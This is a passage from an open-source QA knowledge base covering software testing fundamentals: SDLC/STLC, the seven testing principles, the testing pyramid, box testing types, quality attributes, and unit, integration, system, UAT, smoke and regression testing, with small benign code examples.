docs.title: 📖 What Is This Repository?
docs.text:
This is a free, open-source, community-driven software testing knowledge base that covers everything a QA engineer needs — from day one basics to expert-level automation, security, and performance testing.

Whether you are: - 🎓 A student starting your QA career - 💼 A Manual Tester wanting to grow into automation - 🤖 An Automation Engineer looking for best practices - 🧑‍💼 A QA Lead/Manager who needs templates & frameworks - 🎯 A Developer who wants to write better tests

This repository is for you.

Start here. These are the foundational concepts every QA engineer must master.

docs.title: Definition
docs.text:
Software Testing is the process of evaluating and verifying that a software product or application does what it is supposed to do. It involves executing a system in order to find defects, ensure it meets requirements, and deliver a quality product to users.

"Software testing is not just about finding bugs — it's about building confidence in the product."

docs.title: Why Is Testing Necessary?
docs.text: Reason Explanation Find Defects Early Bugs found early cost 10–100x less to fix than in production Business Risk Faulty software can cause financial loss, legal issues, reputation damage User Satisfaction Quality software leads to better user experience and retention Regulatory Compliance Industries like healthcare and finance require certified quality Security Untested software is vulnerable to cyberattacks

docs.title: Real-World Impact of Poor Testing
docs.text:
• 🚀 NASA Mars Orbiter (1999) — Crashed due to unit mismatch (metric vs imperial). Cost: $327 million
  • 💸 Knight Capital (2012) — Faulty trading software lost $440 million in 45 minutes
  • 🏥 Therac-25 (1985–87) — Radiation therapy machine software bug caused patient deaths

docs.title: Goals of Software Testing
docs.text:
1. Defect Detection — Find bugs before users do
  2. Quality Assessment — Measure software quality against requirements
  3. Risk Mitigation — Identify and reduce risks before release
  4. Confidence Building — Give stakeholders confidence to release
  5. Compliance Verification — Ensure regulatory standards are met

docs.title: What Does a Tester Do?
docs.text:
Understand Requirements
        ↓
Create Test Plans & Test Cases
        ↓
Set Up Test Environment
        ↓
Execute Tests
        ↓
Report Defects
        ↓
Verify Fixes (Retest)
        ↓
Sign Off on Release

docs.title: Testing vs Debugging
docs.text: Aspect Testing Debugging Done by QA Engineers Developers Goal Find defects Fix defects Process Planned, systematic Investigative Output Defect reports Fixed code

docs.title: Key Terms
docs.text: Term Meaning Bug / Defect A flaw in the software Test Case A set of conditions to verify a feature Test Suite A collection of test cases Test Plan Document outlining the testing approach Test Environment Hardware/software setup for testing UAT User Acceptance Testing

docs.title: 📌 Key Takeaways
docs.text:
• Testing ≠ Quality Assurance (QA is broader — process improvement)
  • 100% testing is impossible — we test based on risk
  • Testing can show presence of bugs but NOT their absence
  • Testing is a skill that requires domain knowledge, creativity, and analytical thinking

Next → SDLC vs STLC

docs.title: Software Development Life Cycle (SDLC)
docs.text: SDLC is the overall process of planning, creating, testing, and deploying software. Testing is one phase within SDLC.

docs.title: SDLC Phases
docs.text:
1. Requirement Analysis
        ↓
2. System Design
        ↓
3. Implementation (Coding)
        ↓
4. Testing
        ↓
5. Deployment
        ↓
6. Maintenance

docs.title: Software Testing Life Cycle (STLC)
docs.text: STLC is the sequence of activities specifically for testing that ensures software quality objectives are met.

docs.title: STLC Phases
docs.text:
Phase 1: Requirement Analysis
   → Review requirements, identify testable items, create RTM

Phase 2: Test Planning
   → Effort estimation, resource allocation, risk assessment, test plan

Phase 3: Test Case Design
   → Write test cases, prepare test data, review test cases

Phase 4: Test Environment Setup
   → Configure hardware/software, deploy build, smoke test env

Phase 5: Test Execution
   → Execute test cases, log defects, retest fixed bugs

Phase 6: Test Closure
   → Test summary report, lessons learned, archive artifacts

docs.title: SDLC vs STLC Comparison
docs.text: Aspect SDLC STLC Scope Entire software development Only testing activities Owner Development team + all stakeholders QA team Goal Build the product Verify the product quality Output Working software Quality-assured software Phases 6 phases (Req → Maintenance) 6 phases (Req Analysis → Closure) Starts when Project kickoff Requirements are available Ends when Product is in production Test closure report is signed off

docs.title: Phase 1: Requirement Analysis
docs.text: Criteria Entry Requirements document available Exit RTM created, testable requirements identified

docs.title: Phase 2: Test Planning
docs.text: Criteria Entry Requirements signed off Exit Test plan document approved

docs.title: Phase 3: Test Case Design
docs.text: Criteria Entry Test plan approved Exit Test cases reviewed and approved

docs.title: Phase 4: Test Environment Setup
docs.text: Criteria Entry Test plan ready, environment specs defined Exit Environment ready, smoke test passed

docs.title: Phase 5: Test Execution
docs.text: Criteria Entry Test cases ready, environment stable, build deployed Exit All high-priority test cases executed, critical bugs fixed

docs.title: Phase 6: Test Closure
docs.text: Criteria Entry Test execution complete Exit Test closure report signed off

docs.title: SDLC Models and Their Impact on Testing
docs.text: SDLC Model Testing Approach Waterfall Testing after development complete — risky, late defect detection V-Model Testing planned at each dev phase — better traceability Agile/Scrum Continuous testing in every sprint — fast feedback DevOps Automated testing in CI/CD pipeline — shift-left Spiral Risk-driven testing at each iteration

docs.title: 📌 Key Takeaways
docs.text:
• SDLC is the parent process; STLC is a subset within it
  • STLC starts as soon as requirements are available (not after coding!)
  • Each STLC phase has defined Entry and Exit criteria
  • In Agile, STLC is compressed into 2-week sprints

Next → Seven Testing Principles

docs.title: The 7 Principles of Software Testing
docs.text: These principles were established by the ISTQB and form the foundation of all professional testing practices.

docs.title: Principle 1: Testing Shows the Presence of Defects
docs.text:
Testing can show that defects are present, but cannot prove that there are no defects.

Even after extensive testing, it is impossible to guarantee that software is bug-free. Testing reduces the probability of undiscovered defects but doesn't eliminate the risk entirely.

Example: You tested 1000 test cases and all passed. This doesn't mean the software is bug-free — untested paths may still have bugs.

docs.title: Principle 2: Exhaustive Testing Is Impossible
docs.text:
Testing everything is not feasible (except for trivial cases). Instead of exhaustive testing, we use risk analysis and priorities to focus testing efforts.

Example: A login form with just 3 fields (email, password, remember_me) has millions of possible input combinations. We use Equivalence Partitioning to reduce test cases to a manageable set.

docs.title: Principle 3: Early Testing Saves Time and Money
docs.text: Testing should start as early as possible in the Software Development Life Cycle (SDLC). Finding and fixing bugs early is significantly cheaper than fixing them in production.

docs.title: Cost of Defect by Phase
docs.text:
Phase Found Relative Cost to Fix Requirements 1x Design 5x Development 10x Testing 20x Production 100x+

Example: A missing requirement found during review costs 1 hour to fix. The same issue found in production may cost weeks of hotfixes, rollbacks, and customer communication.

docs.title: Principle 4: Defect Clustering
docs.text:
A small number of modules contain most of the defects. Defects tend to cluster in specific high-risk areas of the software.

This is related to the Pareto Principle (80/20 Rule): 80% of bugs are found in 20% of the code.

Example: In an e-commerce app, the checkout and payment modules consistently have the most defects. Testing effort should be concentrated there.

docs.title: Principle 5: Beware of the Pesticide Paradox
docs.text:
If the same tests are repeated over and over, they will eventually stop finding new bugs. Test cases need to be reviewed and updated regularly to remain effective.

Example: Running the same regression suite for 6 sprints finds fewer bugs each time. New test cases covering new features and edge cases must be added continuously.

docs.title: Principle 6: Testing Is Context-Dependent
docs.text:
Testing is done differently in different contexts. Safety-critical software (medical, aerospace) is tested differently from an e-commerce website.

Context Testing Approach Banking app Security + accuracy + compliance first E-commerce Performance + usability + payment flow Medical device Safety-critical, regulatory compliance (FDA) Mobile game Compatibility + performance + UX Startup MVP Speed over thoroughness

docs.title: Principle 7: Absence-of-Errors Fallacy
docs.text:
Finding and fixing defects does not help if the system is unusable or doesn't meet business requirements. A bug-free system that doesn't solve the user's problem is still a failed system.

Example: A banking app with zero bugs but a confusing, unusable UI will still fail in the market. Quality includes usability, not just defect-free code.

docs.title: Quick Revision Summary
docs.text:
# Principle One Line 1 Testing shows presence of defects Can't prove zero bugs 2 Exhaustive testing impossible Use risk & priority 3 Early testing saves cost Shift-left approach 4 Defect clustering 80% bugs in 20% code 5 Pesticide paradox Update test cases regularly 6 Context-dependent No one-size-fits-all 7 Absence-of-errors fallacy Usability matters too

Next → Verification vs Validation

docs.title: The Simple Difference
docs.text: Verification Validation Question "Are we building the product right?" "Are we building the right product?" Focus Process Product When During development After development Checks Requirements, Design, Code Working software Done by QA team (reviews, walkthroughs) QA team + end users (testing, UAT) Type Static testing (no execution) Dynamic testing (execution needed)

docs.title: Verification
docs.text: Verification ensures the software conforms to specifications. It checks whether the product is being built according to the design and requirements.

docs.title: Verification Techniques
docs.text:
• Reviews — Formal or informal examination of documents
  • Walkthroughs — Author guides team through the document
  • Inspections — Formal structured review with roles (moderator, author, inspectors)
  • Static Analysis — Tools that analyze code without executing it (SonarQube, ESLint)

docs.title: Examples of Verification
docs.text:
• Reviewing the System Requirements Specification (SRS)
  • Reviewing the design document against requirements
  • Code review by peers
  • Reviewing test cases against requirements

docs.title: Validation
docs.text: Validation ensures the software meets user needs and expectations. It confirms the final product works correctly.

docs.title: Validation Techniques
docs.text:
• Functional Testing — Does it do what users need?
  • User Acceptance Testing (UAT) — End users verify the system
  • Integration Testing — Do all components work together?
  • System Testing — End-to-end system behavior

docs.title: Examples of Validation
docs.text:
• Running the application and testing login functionality
  • Executing test cases and comparing with expected results
  • UAT where business users test real workflows
  • Performance testing to check response times

docs.title: The V-Model (Verification & Validation Model)
docs.text:
Requirements Analysis  ←──────────────────→  Acceptance Testing
        ↓                                              ↑
System Design          ←────────────────→  System Testing
        ↓                                      ↑
Architecture Design    ←──────────→  Integration Testing
        ↓                              ↑
Module Design          ←──→  Unit Testing
        ↓              ↑
       Coding ─────────────

Each development phase has a corresponding testing phase.

docs.title: Real-World Example
docs.text:
Scenario: Building an online banking fund transfer feature

Activity V or V? Example Reviewing SRS for fund transfer requirements ✅ Verification Is "max transfer ₹1 lakh/day" documented? Reviewing transfer screen design mock ✅ Verification Does UI match UX spec? Code review of transfer module ✅ Verification Is input validation code correct? Executing test case: transfer ₹500 ✅ Validation Does money actually transfer? UAT by bank operations team ✅ Validation Does business flow work end-to-end?

docs.title: 📌 Key Takeaways
docs.text:
• Verification = Static (no code execution) | Validation = Dynamic (code executed)
  • Verification = process quality | Validation = product quality
  • Both are essential — a system can pass verification but fail validation
  • V-Model maps each development phase to a corresponding test phase

Next → Error vs Defect vs Failure

docs.title: Error vs Defect vs Failure vs Fault
The Chain of Events
docs.text:
Human makes ERROR
      ↓
Code contains FAULT/DEFECT
      ↓
Software exhibits FAILURE

docs.title: 🧠 Error
docs.text:
An error is a human mistake made by a developer, analyst, or tester that introduces a problem.

Example: A developer misunderstands the requirement that "age must be ≥ 18" and writes code checking age > 18 (missing the equals case — 18-year-olds are rejected).

docs.title: 🐛 Defect (Bug / Fault)
docs.text:
A defect is the result of the error — a flaw in the code, design, or document that causes the system to behave incorrectly.

Example: The code if age > 18 instead of if age >= 18 is the defect in the source code.

docs.title: 💥 Failure
docs.text:
A failure is the observable incorrect behavior of the software when the defect is executed.

Example: A user aged exactly 18 tries to register and gets the error "You must be 18 or older" — this is the failure the user experiences.

docs.title: 🔧 Fault
docs.text: A fault is often used interchangeably with defect. In some standards (IEEE), fault specifically refers to the incorrect step, process, or data definition in a program.

docs.title: Comparison Table
docs.text: Term Who Creates It Where It Lives When Visible Error Human (dev, analyst, QA) In the mind When person makes a mistake Defect/Bug/Fault Error introduces it In code/doc/design When code is reviewed or executed Failure Defect causes it In the running system When user/tester observes wrong behavior

docs.title: Can a Defect Exist Without a Failure?
docs.text:
YES! A defect in code may never cause a failure if: - That code path is never executed - The defect is masked by another defect - The environment doesn't trigger it

Example: A bug in the "dark mode" color of the error message exists, but only users in dark mode who trigger that specific error will ever see the failure.

docs.title: Real-World Examples
docs.text: Error Defect Failure Dev forgot to add null check if (user.name) missing null check App crashes when user has no name Analyst wrote wrong formula Discount calculated as 10% instead of 15% Customer overcharged at checkout QA wrote wrong expected result Test passes incorrectly Bug ships to production undetected

docs.title: Defect Vs Bug Vs Issue
docs.text: Term Usage Bug Informal, common term in Agile/daily use Defect Formal term in test documentation Issue Jira term — broader (includes questions, tasks, improvements) Incident Production failure report

docs.title: 📌 Key Takeaways
docs.text:
• Error → Human mistake
  • Defect → Flaw in artifact (code/design)
  • Failure → Visible wrong behavior
  • Not all defects cause failures (dormant bugs)
  • ISTQB exam uses these terms precisely — know the chain!

Next → Testing Pyramid

docs.title: What Is the Testing Pyramid?
docs.text:
The Testing Pyramid is a framework that helps teams decide how many tests to write at each level. It was introduced by Mike Cohn and shows the ideal distribution of test types for a healthy test suite.

          /\
         /  \
        / E2E\          ← Few (Slow, Expensive)
       /──────\
      /        \
     / Integration\     ← Some (Medium speed)
    /──────────────\
   /                \
  /    Unit Tests    \  ← Many (Fast, Cheap)
 /____________________\

docs.title: 🔻 Layer 1: Unit Tests (Foundation — Most Tests)
docs.text:
• Test individual functions/methods in isolation
  • Written by developers
  • Fast — run in milliseconds
  • Cheap — easy to write and maintain
  • High ROI — catch bugs at the source

Example: 

def calculate_discount(price, percent):
    return price * (percent / 100)

def test_calculate_discount():
    assert calculate_discount(1000, 10) == 100
    assert calculate_discount(500, 0) == 0

docs.title: 🔶 Layer 2: Integration Tests (Middle — Some Tests)
docs.text:
• Test interactions between components (API + DB, Service + Service)
  • Verify that modules work together correctly
  • Slower than unit tests but faster than E2E
  • Medium cost to write and maintain

Example: - Testing that the /login API correctly queries the database and returns JWT token - Testing that the payment service correctly calls the bank API

docs.title: 🔺 Layer 3: End-to-End Tests (Top — Few Tests)
docs.text:
• Test complete user journeys through the real UI
  • Simulate real user behavior (Selenium, Playwright, Cypress)
  • Slowest — take minutes to hours
  • Most expensive — brittle, hard to maintain
  • Should cover only critical business flows

Example: - User opens browser → Goes to /login → Enters credentials → Clicks login → Lands on dashboard → Adds item to cart → Checks out → Sees order confirmation

docs.title: The Ice Cream Anti-Pattern 🍦
docs.text:
The Ice Cream Cone is the anti-pattern of the pyramid — too many E2E tests, few unit tests. This leads to:

      /\
     /E2E\           ← Too many! Slow, flaky, expensive
    /──────\
   / Manual \        ← Even worse — not automated
  /──────────\
 /Integration \      ← Some
/──────────────\
(tiny unit base)     ← Almost none

Problems: - Slow CI/CD pipelines (hours instead of minutes) - Flaky tests that fail randomly - Hard to pinpoint root cause when E2E fails - High maintenance cost

docs.title: Ideal Test Distribution
docs.text: Level Percentage Example Count Unit 70% 700 tests Integration 20% 200 tests E2E 10% 100 tests

docs.title: Cost vs Confidence Matrix
docs.text: Unit Integration E2E Speed ⚡ Milliseconds 🕐 Seconds 🕐 Minutes Cost 💰 Low 💰💰 Medium 💰💰💰 High Maintenance ✅ Easy 🔶 Medium ❌ Hard Confidence 🔶 Module level ✅ System level ✅✅ Business flow Failure Isolation ✅ Precise 🔶 Medium ❌ Hard to trace

docs.title: 📌 Key Takeaways
docs.text:
• Unit > Integration > E2E in quantity
  • Unit tests = developer's responsibility; E2E = QA's specialty
  • Avoid the Ice Cream Anti-Pattern
  • E2E tests should cover critical happy paths only
  • A fast test suite = faster CI/CD = faster releases

Next → Black Box vs White Box vs Grey Box

docs.title: Black Box vs White Box vs Grey Box Testing
Overview
docs.text: Black Box White Box Grey Box Knowledge of code None Full Partial Done by QA Testers Developers QA + Dev collaboration Based on Requirements/specs Code logic Architecture + requirements Technique Functional Structural Combined Also called Specification-based Code-based, Glass box Translucent box

docs.title: 🟥 Black Box Testing
docs.text: Tester has NO knowledge of internal code. Testing is based purely on input/output behavior against requirements.

docs.title: Techniques
docs.text:
• Equivalence Partitioning
  • Boundary Value Analysis
  • Decision Table Testing
  • State Transition Testing
  • Use Case Testing

docs.title: Advantages
docs.text:
• No programming knowledge required
  • Tests from user's perspective
  • Unbiased — tester doesn't know implementation

docs.title: Disadvantages
docs.text:
• Can't verify internal logic
  • May miss code paths
  • Redundant test cases possible

docs.title: When to Use
docs.text:
• Functional testing, UAT, System testing
  • When requirements are well-defined

docs.title: ⬜ White Box Testing
docs.text: Tester has FULL knowledge of internal code structure, logic, and implementation.

docs.title: Techniques
docs.text:
• Statement Coverage — every line of code executed at least once
  • Branch Coverage — every branch (if/else) executed
  • Path Coverage — every possible execution path
  • Condition Coverage — every boolean condition tested

docs.title: Example
docs.text:
def login(username, password):
    if username == "admin":        # Branch 1
        if password == "pass123":  # Branch 2
            return "Success"
        else:
            return "Wrong Password"
    else:
        return "User Not Found"
White box testing would create test cases to cover ALL branches above.

docs.title: Advantages
docs.text:
• Thorough — tests internal logic
  • Finds hidden bugs in code paths
  • Optimizes code quality

docs.title: Disadvantages
docs.text:
• Requires programming knowledge
  • Time-consuming for large codebases
  • Missing requirements not caught

docs.title: When to Use
docs.text:
• Unit testing, code reviews
  • Security testing, optimization

docs.title: 🔷 Grey Box Testing
docs.text: Tester has PARTIAL knowledge — knows the architecture and database schema but not the internal code.

docs.title: Common in
docs.text:
• API Testing (you know the endpoint contracts but not the implementation)
  • Database Testing (you can query the DB to verify results)
  • Integration Testing

docs.title: Example
docs.text: Testing a "Transfer Funds" API: - Known (grey knowledge): API endpoint, DB schema (transactions table) - Not known: Internal banking logic code - Test approach: Call API, then query DB to verify record was created correctly

docs.title: Advantages
docs.text:
• More effective than pure black box
  • Finds integration issues
  • Realistic — most QA engineers work this way

docs.title: Comparison Summary
docs.text: Factor Black Box White Box Grey Box Code Access ❌ No ✅ Full 🔶 Partial Requirement Focus ✅ High 🔶 Medium ✅ High Technical Skill Needed Low High Medium Coverage Functional Structural Both Best for UAT, System Unit API, Integration

docs.title: 📌 Key Takeaways
docs.text:
• Black box = user's perspective, no code knowledge
  • White box = developer's perspective, full code knowledge
  • Grey box = QA engineer's daily reality — partial knowledge
  • Most real-world testing is grey box in practice

Next → Static vs Dynamic Testing

docs.title: Overview
docs.text: Static Testing Dynamic Testing Code execution ❌ Not required ✅ Required When Early SDLC phases After code is written Goal Find defects in artifacts Find failures in running software Done on Docs, design, code Running system Types Reviews, walkthroughs, static analysis Functional, performance, security testing

docs.title: 🔍 Static Testing
docs.text: Testing performed without executing the software. It involves reviewing documents and code.

docs.title: 1. Reviews
docs.text:
Manual examination of documents by human reviewers.

Review Type Description Formality Informal Review Colleague checks your work casually Lowest Walkthrough Author guides team through document Low-Medium Technical Review Peers review technical accuracy Medium Inspection Formal, structured process with defined roles Highest

docs.title: 2. Static Analysis (Tool-based)
docs.text:
Automated tools analyze code without executing it.

Tool Language What It Checks SonarQube Java, Python, JS Code quality, security, duplications ESLint JavaScript Code style, errors Pylint Python Code style, errors Checkstyle Java Coding standards Bandit Python Security vulnerabilities

docs.title: What Static Testing Can Find
docs.text:
• Spelling/grammar errors in requirements
  • Missing requirements
  • Design flaws
  • Code violations (naming, standards)
  • Security vulnerabilities in code
  • Dead code, unused variables

docs.title: ▶️ Dynamic Testing
docs.text: Testing performed by executing the software with test inputs and observing outputs.

docs.title: Types of Dynamic Testing
docs.text: Category Examples Functional Unit, Integration, System, UAT Non-Functional Performance, Security, Usability Regression Re-running tests after changes Confirmation Retesting fixed defects

docs.title: Black Box vs White Box in Dynamic Testing
docs.text:
• Black box dynamic — Execute and check output against requirements
  • White box dynamic — Execute and check code coverage

docs.title: What Each Can Find
docs.text: Defect Type Static Dynamic Requirements errors ✅ ❌ Design flaws ✅ 🔶 Code violations ✅ ❌ Runtime errors ❌ ✅ Performance issues ❌ ✅ Security vulnerabilities ✅ (partial) ✅ Business logic errors 🔶 ✅ Usability issues ❌ ✅

docs.title: Cost Benefit: Start Static, Then Dynamic
docs.text:
Requirements → [Static: Review] → Design → [Static: Inspect] → Code → [Static: Analyze]
                                                                          ↓
                                                              [Dynamic: Execute Tests]

Static testing finds bugs before they become expensive to fix.

docs.title: 📌 Key Takeaways
docs.text:
• Static = review (no execution) | Dynamic = execute (run the system)
  • Static testing is cheaper — find bugs in documents before code is written
  • Both are necessary — static finds different defects than dynamic
  • Inspections are the most effective static technique (finds up to 70% of defects)

Next → Software Quality Attributes

docs.title: What Is Software Quality?
docs.text: Software quality is the degree to which a software product satisfies stated and implied needs. The ISO/IEC 25010 standard defines a Product Quality Model with 8 main quality characteristics.

docs.title: 1. 🎯 Functional Suitability
docs.text:
Does the software provide the right functions?

Sub-characteristic Meaning Functional completeness All functions specified are present Functional correctness Functions produce correct results Functional appropriateness Functions facilitate task accomplishment

Test types: Functional testing, UAT

docs.title: 2. ⚡ Performance Efficiency
docs.text:
How well the software performs under given conditions?

Sub-characteristic Meaning Time behavior Response/processing time Resource utilization CPU, memory, network usage Capacity Maximum limits (users, data)

Test types: Load, stress, performance testing

docs.title: 3. 🔒 Security
docs.text:
Degree to which software protects data and systems.

Sub-characteristic Meaning Confidentiality Data only accessible to authorized users Integrity Data not modified unauthorized Non-repudiation Actions can be proved to have occurred Authenticity Identity of users can be verified

Test types: Security, penetration testing

docs.title: 4. 🔧 Maintainability
docs.text:
How easily the software can be modified and maintained?

Sub-characteristic Meaning Modularity Changes have minimal impact on others Reusability Components can be reused Analysability Easily diagnosable Modifiability Easy to modify without defects Testability How easily tests can be established

docs.title: 5. 🔄 Reliability
docs.text:
Software performs its functions under specified conditions for a period of time.

Sub-characteristic Meaning Maturity Meets reliability needs under normal operation Availability Operational and accessible when needed (uptime %) Fault tolerance Operates despite hardware/software faults Recoverability Recovers data and state after interruption

Test types: Reliability, soak testing

docs.title: 6. 🤝 Compatibility
docs.text:
Operates with other products, systems, environments.

Sub-characteristic Meaning Co-existence Shares environment without negative impact Interoperability Exchanges information with other systems

Test types: Compatibility, integration testing

docs.title: 7. 😊 Usability
docs.text:
How effectively users can use the product.

Sub-characteristic Meaning Appropriateness recognizability Users can recognize if it fits their needs Learnability How easy to learn Operability Easy to operate and control User error protection Protects users from errors Accessibility Usable by people with disabilities (WCAG)

Test types: Usability, accessibility testing

docs.title: 8. 📦 Portability
docs.text:
How effectively the software can be transferred to another environment.

Sub-characteristic Meaning Adaptability Can be adapted to different environments Installability Can be installed/uninstalled effectively Replaceability Can replace other software for same purpose

docs.title: Summary Table
docs.text: Quality Attribute Key Question Test Type Functional Suitability Does it do the right things? Functional Performance Efficiency Is it fast enough? Performance Security Is it safe? Security Maintainability Is it easy to change? Code review Reliability Does it work consistently? Reliability/Soak Compatibility Does it work with others? Compatibility Usability Is it easy to use? Usability Portability Can it run elsewhere? Portability

docs.title: 📌 Key Takeaways
docs.text:
• Quality is multi-dimensional — not just "does it work?"
  • Each quality attribute requires a different testing approach
  • ISO 25010 is the modern standard replacing ISO 9126
  • In practice, prioritize attributes based on the product domain (e.g., security for banking, performance for gaming)

You've completed Fundamentals! Next → Testing Types

docs.title: 📂 Testing Types
docs.text: This section covers Functional and Non-Functional testing methodologies used to verify software.

docs.title: 1. Functional Testing
docs.text: Testing the software against the functional requirements/specifications. - Unit Testing - Integration Testing - System Testing - UAT / Acceptance Testing - Smoke Testing - Sanity Testing (Redirect) - Regression Testing

docs.title: 2. Non-Functional Testing
docs.text: Testing the software characteristics like performance, security, usability, etc. - Performance Testing - Security Testing - Load, Stress, Spike, Soak, Usability, Compatibility, Accessibility, and Recovery Testing.

docs.title: What is Unit Testing?
docs.text:
Unit Testing is the first level of dynamic testing. It involves testing the smallest testable part (unit) of an application—typically a single function, method, class, or module—in isolation from the rest of the system.

"Test the pieces in absolute isolation to make sure the building blocks are strong."

docs.title: Key Characteristics
docs.text:
• Done By: Developers.
  • When: During the coding phase (Implementation).
  • Isolation: Uses mocks, stubs, and fakes to isolate the unit from databases, network APIs, or other modules.
  • Execution Speed: Extremely fast (runs in milliseconds).
  • Coverage Type: White-box testing (requires code visibility).

docs.title: Unit Testing Frameworks
docs.text: Language Frameworks Python unittest, pytest Java JUnit, TestNG JavaScript Jest, Mocha, Jasmine C# NUnit, xUnit

docs.title: Simple Python Unit Test Example
docs.text:
# calculator.py
def add(a, b):
    return a + b

# test_calculator.py
import unittest
from calculator import add

class TestCalculator(unittest.TestCase):
    def test_add_positive_numbers(self):
        self.assertEqual(add(2, 3), 5)

    def test_add_negative_numbers(self):
        self.assertEqual(add(-1, -1), -2)

if __name__ == '__main__':
    unittest.main()

docs.title: 📌 Key Takeaways
docs.text:
• Catches bugs early when they are easiest and cheapest to fix.
  • Simplifies debugging because failures pinpoint exact code lines.
  • Acts as living documentation for developers.

docs.title: What is Integration Testing?
docs.text:
Integration Testing is the level of testing where individual software modules are combined and tested as a group. Its purpose is to expose faults in the interaction and interface between integrated units.

"Individual blocks might work perfectly, but do they fit together seamlessly?"

docs.title: 1. Big Bang Integration
docs.text: All or most of the developed modules are coupled together to form a complete system, and then tested. - Pros: Simple for small systems. - Cons: High risk, extremely difficult to isolate bugs.

docs.title: 2. Top-Down Integration
docs.text: Testing takes place from top to bottom, following the control flow. Lower-level modules are simulated using Stubs. - Stub: A dummy module that simulates the behavior of a lower-level module.

docs.title: 3. Bottom-Up Integration
docs.text: Testing takes place from bottom to top. High-level modules are simulated using Drivers. - Driver: A dummy module that simulates the behavior of a higher-level module (invokes the code under test).

docs.title: 4. Sandwich/Hybrid Integration
docs.text: Combines Top-Down and Bottom-Up approaches to test both layers simultaneously.

docs.title: Stubs vs Drivers Example
docs.text:
[Main Module (Control)]  ← Top Level
             │
      ┌──────┴──────┐
  [Module A]    [Module B]     ← Mid Level
     │
  [Module C]                   ← Bottom Level (Lowest)
  • If testing Main Module without Module A or B: You need Stubs (dummies underneath).
  • If testing Module C without Module A: You need a Driver (dummy above to call C).

docs.title: 📌 Key Takeaways
docs.text:
• Focuses purely on communication protocols, data formats, and API interactions.
  • Prevents database integrity issues and API handshake failures.
  • Crucial before moving to the system-wide validation layer.

docs.title: What is System Testing?
docs.text:
System Testing is the first level where the complete, integrated application is tested as a whole. It evaluates the system's compliance with its specified requirements.

"Evaluate the entire engine, not just the pistons or spark plugs."

docs.title: Key Characteristics
docs.text:
• Done By: Independent QA team.
  • Approach: Black-box testing (no knowledge of internal code).
  • Environment: Staging / QA environment designed to replicate production closely.
  • Focus: Functional requirements, end-to-end user journeys, and non-functional compliance.

docs.title: What is Verified in System Testing?
docs.text:
1. End-to-End Workflows: Testing complete business processes (e.g., Search Item → Add to Cart → Pay → Get Invoice).
  2. System Resources: Interactions with external peripherals, file systems, and hardware.
  3. Data Integrity: Verification that state is correctly updated across databases and third-party systems.
  4. Performance & Reliability: Response times, error handling, recovery, and security constraints.

docs.title: System Testing vs Unit Testing
docs.text: Feature Unit Testing System Testing Scope Smallest testable unit Entire application Method White-box Black-box Executed by Developers QA Engineers Mocks used Yes (heavy use of fakes/mocks) No (uses real DB/APIs)

docs.title: 📌 Key Takeaways
docs.text:
• The first time the system is tested from the actual user's perspective.
  • Verifies that business requirements are completely fulfilled.
  • Prepares the application for the final checkpoint: User Acceptance Testing (UAT).

docs.title: What is UAT?
docs.text:
User Acceptance Testing (UAT), also called Beta Testing or End-User Testing, is the final phase of the software testing process. It determines whether the software is fit for operational use and meets the business requirements.

"Does the system actually solve the customer's problem in their real-world workflow?"

docs.title: 1. Alpha Testing
docs.text:
• Who: Performed by internal QA and business teams in the development environment.
  • When: Before releasing to external users.

docs.title: 2. Beta Testing
docs.text:
• Who: Performed by actual customers/end-users in their own environments.
  • Goal: Gather real-world feedback and expose unexpected environment issues.

docs.title: 3. Operational Acceptance Testing (OAT)
docs.text:
• Who: System administrators/operations.
  • Focus: Backup/restore, disaster recovery, security checks, and maintenance procedures.

docs.title: 4. Contract and Regulation Acceptance Testing
docs.text: • Checks compliance with legal contracts or governmental safety regulations (e.g., GDPR, HIPAA).

docs.title: The UAT Workflow
docs.text:
Receive Requirements & Specs
         ↓
Develop UAT Test Scenarios (Business cases)
         ↓
Set Up UAT Environment (Production mirror)
         ↓
Business Users / QA Execute Scenarios
         ↓
Log & Resolve Blockers
         ↓
Sign Off (Go / No-Go Decision)

docs.title: 📌 Key Takeaways
docs.text:
• It is the ultimate boundary before the software goes to Production.
  • Focuses on business utility and usability, not just code correctness.
  • The outcome is a formal "Sign-Off" from the business sponsors.

docs.title: What Is Smoke Testing?
docs.text:
Smoke Testing is a preliminary test that checks whether the most critical functions of a software build work correctly. It determines if the build is stable enough for further testing.

"Smoke testing is like turning on a new piece of hardware — if it doesn't smoke (catch fire), it's safe to proceed."

Also called: Build Verification Test (BVT) or Confidence Testing

docs.title: Purpose
docs.text: Goal Description Verify stability Is the build deployable to QA? Save time Reject unstable builds early Quick confidence Takes 30–60 minutes max Gate keeper Prevents wasted effort on broken builds

docs.title: What Does Smoke Testing Cover?
docs.text: Smoke tests cover the most critical, high-level functionalities — NOT edge cases or detailed flows.

docs.title: E-Commerce App Example
docs.text:
• ✅ Application launches without crash
  • ✅ Homepage loads
  • ✅ User can login
  • ✅ Product search works
  • ✅ Can add item to cart
  • ✅ Checkout page opens
  • ❌ Does NOT test: coupon edge cases, address validation details, etc.

docs.title: When Is Smoke Testing Done?
docs.text:
Developer delivers new build
          ↓
QA runs Smoke Test (30-60 min)
          ↓
      Pass? ──────→ Proceed to full testing
          ↓
         Fail
          ↓
Build rejected → Back to developers

docs.title: Smoke vs Sanity vs Regression
docs.text: Aspect Smoke Sanity Regression When New build received After minor fix/patch After any code change Scope Entire app (high-level) Specific feature only Full or partial suite Depth Shallow Narrow but deeper Deep Who QA or automation QA QA / Automation Goal Is build stable? Does fix work? Did fix break anything? Duration 30–60 min 15–30 min Hours/days Documented? Sometimes Rarely Always

docs.title: Sample Smoke Test Cases — Login Module
docs.text: TC ID Test Step Expected Result SMK_001 Open application URL Page loads in <3 sec SMK_002 Login with valid credentials Dashboard displayed SMK_003 Navigate to product page Products listed SMK_004 Logout Redirected to login page

docs.title: Smoke Testing in CI/CD
docs.text:
In modern DevOps, smoke tests are automated and triggered on every new build:

# GitHub Actions example
on: [push]
jobs:
  smoke-test:
    runs-on: ubuntu-latest
    steps:
      - name: Run Smoke Tests
        run: pytest tests/ -m smoke --timeout=60

docs.title: 📌 Key Takeaways
docs.text:
• Smoke = shallow, wide (covers everything briefly)
  • Must run before any detailed testing
  • Failure = reject build immediately
  • Should be automated in CI/CD pipelines
  • Takes 30–60 minutes maximum

Related: Sanity Testing | Regression Testing

docs.title: What Is Regression Testing?
docs.text:
Regression Testing is the process of re-testing a software application after changes (bug fixes, new features, or enhancements) to ensure that previously working functionality still works correctly.

"Regression testing ensures we haven't broken anything that was already working."

docs.title: Why Is It Needed?
docs.text: Every code change, no matter how small, carries the risk of introducing new bugs into previously working features.

docs.title: Real-World Example
